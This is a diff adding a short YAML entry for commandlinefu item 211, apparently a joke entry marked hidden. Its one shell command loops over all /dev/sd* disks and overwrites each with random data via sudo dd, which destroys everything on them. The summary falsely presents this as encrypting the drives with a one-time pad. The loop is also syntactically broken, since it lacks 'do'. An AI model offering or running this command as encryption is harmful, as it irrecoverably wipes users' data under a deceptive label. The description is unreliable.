@@ -1,0 +1,8 @@
+commandlinefu_id: 211
+translator:
+  weibo: ''
+hide: true
+command: |-
+  for disk in /dev/sd*; sudo dd if=/dev/urandom of=$disk; done
+summary: |-
+  Encrypts all your HDDs with a one-time-pad
